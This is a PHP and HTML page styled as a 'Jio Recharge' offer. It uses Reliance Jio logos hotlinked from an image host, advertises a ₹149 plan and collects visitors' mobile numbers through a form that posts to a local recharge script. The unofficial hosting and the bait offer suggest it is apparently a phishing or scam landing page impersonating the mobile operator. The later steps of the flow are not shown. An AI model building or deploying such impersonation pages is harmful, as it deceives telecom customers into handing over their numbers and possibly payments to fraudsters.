<?php
session_start();
$_SESSION['valid_submission'] = false; // Initialize session variable
?>

<!DOCTYPE html>
<html>
<head>
  <title>Offer - Jio Recharge</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
  <script src="https://unpkg.com/unlazy@0.11.3/dist/unlazy.with-hashing.iife.js" defer init></script>
  <script type="text/javascript">
    window.tailwind.config = {
      darkMode: ['class'],
      theme: {
        extend: {
          colors: {
            border: 'hsl(var(--border))',
            input: 'hsl(var(--input))',
            ring: 'hsl(var(--ring))',
            background: 'hsl(var(--background))',
            foreground: 'hsl(var(--foreground))',
            primary: {
              DEFAULT: 'hsl(var(--primary))',
              foreground: 'hsl(var(--primary-foreground))'
            },
            secondary: {
              DEFAULT: 'hsl(var(--secondary))',
              foreground: 'hsl(var(--secondary-foreground))'
            },
            destructive: {
              DEFAULT: 'hsl(var(--destructive))',
              foreground: 'hsl(var(--destructive-foreground))'
            },
            muted: {
              DEFAULT: 'hsl(var(--muted))',
              foreground: 'hsl(var(--muted-foreground))'
            },
            accent: {
              DEFAULT: 'hsl(var(--accent))',
              foreground: 'hsl(var(--accent-foreground))'
            },
            popover: {
              DEFAULT: 'hsl(var(--popover))',
              foreground: 'hsl(var(--popover-foreground))'
            },
            card: {
              DEFAULT: 'hsl(var(--card))',
              foreground: 'hsl(var(--card-foreground))'
            },
          },
        }
      }
    }
  </script>
  <style type="text/tailwindcss">
    @layer base {
      :root {
        --background: 0 0% 100%;
        --foreground: 240 10% 3.9%;
        --card: 0 0% 100%;
        --card-foreground: 240 10% 3.9%;
        --popover: 0 0% 100%;
        --popover-foreground: 240 10% 3.9%;
        --primary: 240 5.9% 10%;
        --primary-foreground: 0 0% 98%;
        --secondary: 240 4.8% 95.9%;
        --secondary-foreground: 240 5.9% 10%;
        --muted: 240 4.8% 95.9%;
        --muted-foreground: 240 3.8% 46.1%;
        --accent: 240 4.8% 95.9%;
        --accent-foreground: 240 5.9% 10%;
        --destructive: 0 84.2% 60.2%;
        --destructive-foreground: 0 0% 98%;
        --border: 240 5.9% 90%;
        --input: 240 5.9% 90%;
        --ring: 240 5.9% 10%;
        --radius: 0.5rem;
      }
      .dark {
        --background: 240 10% 3.9%;
        --foreground: 0 0% 98%;
        --card: 240 10% 3.9%;
        --card-foreground: 0 0% 98%;
        --popover: 240 10% 3.9%;
        --popover-foreground: 0 0% 98%;
        --primary: 0 0% 98%;
        --primary-foreground: 240 5.9% 10%;
        --secondary: 240 3.7% 15.9%;
        --secondary-foreground: 0 0% 98%;
        --muted: 240 3.7% 15.9%;
        --muted-foreground: 240 5% 64.9%;
        --accent: 240 3.7% 15.9%;
        --accent-foreground: 0 0% 98%;
        --destructive: 0 62.8% 30.6%;
        --destructive-foreground: 0 0% 98%;
        --border: 240 3.7% 15.9%;
        --input: 240 3.7% 15.9%;
        --ring: 240 4.9% 83.9%;
      }
    }
    .bg-\[\#0a2885\] {
    --tw-bg-opacity: 1;
    background-color: rgb(10 40 133/var(--tw-bg-opacity))
}
  </style>
</head>
<body>
  <div class="min-h-screen bg-zinc-100 flex flex-col items-center">
    <div class="bg-blue-700 w-full p-4 flex justify-between items-center">
      <button class="text-white">
        <img src="https://i.ibb.co/87Wdbfd/Hamburger-icon-svg.png" alt="Jio Logo" class="mb-4" width="35" height="35" />
      </button>
      <div class="relative w-3/4">
        <input type="text" placeholder="Search" class="w-full p-2 pl-10 rounded-full bg-blue-800 text-white placeholder-white focus:outline-none" />
        <img aria-hidden="true" alt="search-icon" src="https://openui.fly.dev/openui/24x24.svg?text=🔍" class="absolute left-3 top-2.5" />
      </div>
    </div>

    <div class="bg-blue-700 w-full flex justify-center py-8">
      <img src="https://i.ibb.co/Y7p1Ftf/Reliance-Jio-Logo-October-2015-svg.png" alt="Jio Logo" class="mb-4" width="100" height="100" />
    </div>

    <div class="bg-white w-11/12 md:w-1/2 lg:w-1/3 p-6 rounded-lg shadow-lg mt-6">
      <h2 class="text-xl font-semibold text-center text-blue-700 mb-4">Mobile Recharge</h2>
      
      <form action="/recharge/index.php" method="post" onsubmit="return validateForm()">
        <div class="mb-4">
          <label class="block text-zinc-700 font-semibold mb-2">Operator</label>
          <select name="operator" class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
            <option>Jio Prepaid</option>
            <option>Airtel Prepaid</option>
          </select>
        </div>
        <div class="mb-4">
          <label class="block text-zinc-700 font-semibold mb-2">Mobile Number</label>
          <input id="mobileNumber" name="mobileNumber" type="number" placeholder="1234567890" class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
        </div>
        <div class="mb-4 p-4 bg-zinc-100 rounded-lg text-zinc-700">Recharge with a ₹149 plan for a month full of digital delights.</div>
        <button type="submit" class="bg-[#0a2885] py-4 w-full text-[16px] rounded-full font-bold text-white">Recharge</button>
        <div id="errorMessage" class="mt-2 text-red-600"></div>
      </form>

      <script>
      function validateForm() {
        var mobileNumber = document.getElementById("mobileNumber").value;
        var errorMessage = document.getElementById("errorMessage");
        
        if (mobileNumber.length < 10) {
          errorMessage.textContent = "Please enter a valid number";
          return false; // Prevent form submission
        } else {
          errorMessage.textContent = ""; // Clear any previous error message
          return true; // Allow form submission
        }
      }
      </script>
    </div>
  </div>
</body>
</html>
